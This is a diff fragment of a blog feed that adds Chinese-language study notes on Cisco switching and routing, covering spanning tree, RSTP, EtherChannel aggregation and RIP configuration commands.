+<li>配置HelloTime</li>
+<li>配置Forward-Delay Time</li>
+<li>配置Max-AgeTime</li>
+</ol>
+<ul>
+<li>Cisco系列SpanningTree默认配置：（# spanning-tree reset）<ul>
+<li>生成树协议PVST</li>
+<li>STP启用</li>
+<li>STP Proority：32768</li>
+<li>STP port Priority：128</li>
+<li>STP port cost：根据端口速率自动判断</li>
+<li>Hello Time：2s</li>
+<li>Forward-delay Time：15s</li>
+<li>Max-age Time：20s</li>
+</ul>
+<ol>
+<li>启用生成树协议</li>
+<li>关闭生成树协议</li>
+<li>配置生成树协议类型</li>
+<li>配置交换机优先级 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># spanning-tree priority 4096</span></span><br></pre></td></tr></table></figure></li>
+<li>优先级恢复默认值</li>
+<li>配置交换机端口优先级</li>
+<li>显示生成树状态</li>
+<li>显示端口生成树协议状态</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>快速生成树协议（RSTP）：生成树改进，解决收敛慢问题<ol>
+<li>改进方案<ol>
+<li>为根端口和指定端口设置了快速切换用的替换端口（Alternate Port）和备份端口（Backup Port）</li>
+<li>在只连接了两个交换端口的点对点链路中，指定端口只需与下游交换机进行一次握手就可以无时延地进入转发状态</li>
+<li>直接与终端相连而不是把其他交换机相连的端口定义为边缘端口（Edge Port）。边缘端口可以直接进入转发状态，不需要任何延时。</li>
+</ol>
+</li>
+<li>端口三种状态<ol>
+<li>Discarding</li>
+<li>Learning</li>
+<li>Forwarding</li>
+</ol>
+<ul>
+<li>对比一般生成树少了监听listening和阻塞blocking</li>
+</ul>
+</li>
+<li>基于vlan的RSTP <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># show spanning-tree vlan 20</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li>多生成树（MSTP）</li>
+</ol>
+</li>
+<li><h2 id="端口聚合（Ethernet-Channel-以太通道）"><a href="#端口聚合（Ethernet-Channel-以太通道）" class="headerlink" title="端口聚合（Ethernet Channel 以太通道）"></a>端口聚合（Ethernet Channel 以太通道）</h2><ul>
+<li>一组物理端口联合成一个逻辑通道，即通道组，此逻辑通道视作一个端口</li>
+<li>自动提供冗余和负载均衡</li>
+</ul>
+<ol>
+<li>端口聚合类型<ol>
+<li>手工静态配置</li>
+<li>动态协议聚合<ol>
+<li>PAgA（思科私有）<ul>
+<li>On：通道成员不协商，直接开启端口聚合（静态）</li>
+<li>auto：主动</li>
+<li>desirable：被动协商，不发送，只接受协商消息</li>
+<li>Off：关闭</li>
+</ul>
+</li>
+<li>LACP<ul>
+<li>active：主动</li>
+<li>passive：被动协商，不发送，只接受协商消息</li>
+<li>On</li>
+<li>Off</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>链路聚合配置<ul>
+<li>先配置后连线（连线后会生成环路，阻塞） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># int range f0/1-2	</span><br><span class="line"># channel-group 10 mode on	//f1-2加入逻辑端口组10号</span><br><span class="line"># port-channel load-balance mothod	//设置端口负载均衡算法</span><br></pre></td></tr></table></figure>
+ 查看端口配置状态 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># show etherchannel summary</span><br></pre></td></tr></table></figure>
+<h1 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h1></li>
+</ul>
+</li>
+</ol>
+</li>
+<li><h2 id="路由器概述"><a href="#路由器概述" class="headerlink" title="路由器概述"></a>路由器概述</h2><ul>
+<li>基本功能<ol>
+<li>网络互连</li>
+<li>数据处理</li>
+<li>网络管理</li>
+</ol>
+</li>
+<li>分类<ol>
+<li>固定配置路由器</li>
+<li>模块化路由器</li>
+</ol>
+</li>
+<li>控制线缆<ol>
+<li>以太网线缆</li>
+<li>控制台线缆</li>
+<li>串行广域网线缆</li>
+</ol>
+</li>
+<li>常用配置方式<ol>
+<li>控制台方式</li>
+<li>Telnet方式</li>
+<li>网管工作站方式</li>
+<li>TFTP服务器方式</li>
+</ol>
+</li>
+</ul>
+</li>
+<li><h2 id="路由器基础配置"><a href="#路由器基础配置" class="headerlink" title="路由器基础配置"></a>路由器基础配置</h2><h1 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h1></li>
+<li><h2 id="动态路由协议基础概念"><a href="#动态路由协议基础概念" class="headerlink" title="动态路由协议基础概念"></a>动态路由协议基础概念</h2><ul>
+<li>Cisco三种路由方式<ol>
+<li>静态路由：手工定义目的地和路由转发</li>
+<li>动态路由：路由器根据路由表灵活调整</li>
+<li>默认路由：当前路由表中无匹配表项时，做出的默认选择</li>
+</ol>
+</li>
+<li>动态路由优势：<ul>
+<li>灵活调整路由表，选择最优路径</li>
+<li>均衡负载（Load Sharing）</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>自治域系统</li>
+<li>路由协议分类</li>
+<li>邻居关系</li>
+<li>网络路径的度量</li>
+<li>收敛时间</li>
+</ol>
+</li>
+<li><h2 id="RIP协议（典型的距离矢量路由选择算法的内部网关协议）"><a href="#RIP协议（典型的距离矢量路由选择算法的内部网关协议）" class="headerlink" title="RIP协议（典型的距离矢量路由选择算法的内部网关协议）"></a>RIP协议（典型的距离矢量路由选择算法的内部网关协议）</h2><ol>
+<li>特征<ul>
+<li>距离矢量：以跳数为度量值（metric）的距离向量协议</li>
+<li>RIP基于UDP，端口520的应用层协议</li>
+<li>跳数不超过15</li>
+</ul>
+</li>
+<li>分类<ol>
+<li>RIPv1<ul>
+<li>有类路由协议</li>
+<li>没有认证功能</li>
+<li>没有手工汇总功能</li>
+<li>广播更新</li>
+</ul>
+</li>
+<li>RIPv2<ul>
+<li><strong>无类路由协议</strong>（不规则IP地址，如10.xx.xx.xx 255.255.255.0）</li>
+<li>支持明文和MD5认证功能</li>
+<li>可在关闭自动汇总功能前提下，进行手工汇总</li>
+<li>组播更新</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>RIP配置<ul>
+<li>配置步骤：<ol>
+<li>配置路由器接口ip</li>
+<li>配置路由RIP</li>
+<li>DHCP服务配置</li>
+<li>测试 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">启用</span><br><span class="line"><span class="section"># router rip	</span></span><br><span class="line">查看路由表</span><br><span class="line">添加网段</span><br><span class="line"><span class="section"># network [network-num]</span></span><br><span class="line">删除网段</span><br><span class="line"><span class="section"># network [network-num]</span></span><br><span class="line">将版本改为RIPv2</span><br><span class="line"><span class="section"># version 2</span></span><br><span class="line"><span class="section"># no auto-summary</span></span><br><span class="line"><span class="section"># show ip router  </span></span><br><span class="line"><span class="code">	&gt; R	192.168.xx.0/24[120/?] </span></span><br><span class="line"><span class="code">		1. ？: 标识RIP传递跳数) </span></span><br><span class="line"><span class="code">		2. 120：管理距离</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><h2 id="OSPF路由协议"><a href="#OSPF路由协议" class="headerlink" title="OSPF路由协议"></a>OSPF路由协议</h2></li>
+<li><h2 id="EIGRP协议"><a href="#EIGRP协议" class="headerlink" title="EIGRP协议"></a>EIGRP协议</h2></li>
+<li><h2 id="路由重发布"><a href="#路由重发布" class="headerlink" title="路由重发布"></a>路由重发布</h2></li>
+</ol>
+]]></content>
+      <categories>
+        <category>路由与交换</category>
+      </categories>
+      <tags>
+        <tag>交换机</tag>
+        <tag>路由器</tag>
       </tags>
   </entry>
   <entry>
